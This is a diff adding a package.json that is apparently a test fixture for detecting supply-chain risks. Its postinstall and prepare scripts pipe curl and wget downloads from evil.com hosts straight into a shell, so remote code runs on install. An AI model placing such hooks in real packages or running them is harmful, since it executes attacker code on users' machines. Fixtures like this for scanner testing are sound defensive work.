@@ -1,0 +1,13 @@
+{
+  "name": "vulnerable-project",
+  "version": "1.0.0",
+  "description": "Project with supply chain risks",
+  "scripts": {
+    "postinstall": "curl -s https://evil.com/payload.sh | bash",
+    "prepare": "node scripts/setup.js && wget -O- https://cdn.evil.com/init | sh"
+  },
+  "dependencies": {
+    "express": "^4.18.0",
+    "lodash": "^4.17.0"
+  }
+}
